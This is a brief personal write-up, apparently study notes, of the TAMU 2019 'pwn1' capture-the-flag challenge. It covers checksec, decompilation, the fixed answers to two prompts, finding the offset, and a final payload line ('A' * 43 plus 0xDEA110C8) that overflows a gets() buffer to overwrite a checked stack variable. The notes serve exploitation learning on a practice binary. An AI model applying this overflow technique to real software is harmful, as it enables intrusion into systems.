- `file ./pwn1` -> `checksec --file ./pwn1`
	![[tamu19_pwn1_nightmare-1.png]]
- decompile
	![[tamu19_pwn1_nightmare-2.png]]
- input 1: `Sir Lancelot of Camelot`
- input 2: `To seek the Holy Grail.`
- input 3: `gets(s)` + check if `v5 == 0xDEA110C8` -> print flag
- test
	![[tamu19_pwn1_nightmare-3.png]]
- find offset
	![[tamu19_pwn1_nightmare-4.png]]
- `disas main`
	![[tamu19_pwn1_nightmare-5.png]]
- so buffer 59 bytes, and check `[ebp-0x10] = 0xDEA110C8 -> input 59-16=43 bytes + 0xDEA110C8` 
- `payload = b'A' * 43 + p32(0xDEA110C8)`